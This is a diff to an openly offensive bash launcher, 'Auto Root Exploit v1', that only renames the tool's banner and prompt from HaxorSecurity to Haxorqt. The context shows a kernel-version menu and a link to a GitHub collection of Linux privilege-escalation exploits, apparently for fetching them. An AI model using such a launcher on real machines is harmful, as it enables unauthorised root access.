@@ -28,7 +28,7 @@ git=$(which git)
 if [ "$?" != "0" ]; then
     echo "[-] Git -> not found!"
     echo "[*] Continue ? (Y/N)"
-    read -p "haxorsec@Localroot:~# " jawab
+    read -p "haxorqt@Localroot:~# " jawab
     if [ $jawab = "Y" || $jawab = "y" ];then
     clear
     else
@@ -46,7 +46,7 @@ fi
 clear
 echo "==================================================="
 echo "              Auto Root Exploit v1"
-echo "                by HaxorSecurity"
+echo "                by Haxorqt"
 echo "==================================================="
 echo "[x] Your Kernel : "
 uname -a
@@ -58,7 +58,7 @@ echo "[3] 4x.x"
 echo "[4] 5x.x"
 echo "[5] TOP Exploit Root"
 echo "[6] Folder Exploit"
-read -p "haxorsec@Localroot:~# " localroot
+read -p "haxorqt@Localroot:~# " localroot
 link="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/"
 
 kernel2=(
